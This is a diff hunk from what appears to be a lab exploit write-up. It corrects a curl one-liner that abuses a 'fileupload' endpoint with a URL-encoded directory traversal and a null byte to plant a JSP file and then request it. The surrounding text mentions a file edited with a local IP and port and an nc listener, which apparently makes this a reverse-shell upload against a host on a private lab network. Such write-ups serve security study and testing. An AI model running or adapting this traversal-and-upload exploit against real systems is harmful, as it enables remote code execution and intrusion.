@@ -18,7 +18,7 @@ The file 'a.txt' was edited with local IP and port to use.
 Next the one liner POST message was constructed as follows with proper directory traversal string:
 
 ```
-curl -v -X POST "http://192.168.56.101:8022/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=deefunkt%2ephp&customerId=47474747" --data @a.txt --header "Content-Type:application/octet-stream" && http://192.168.56.101:8383/jspf/test.jsp
+curl -v -X POST "http://192.168.56.101:8022/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=deefunkt%2ephp&customerId=47474747" --data @a.txt --header "Content-Type:application/octet-stream" && curl http://192.168.56.101:8022/jspf/test.jsp
 ```
 
 And a simple nc listener started with:
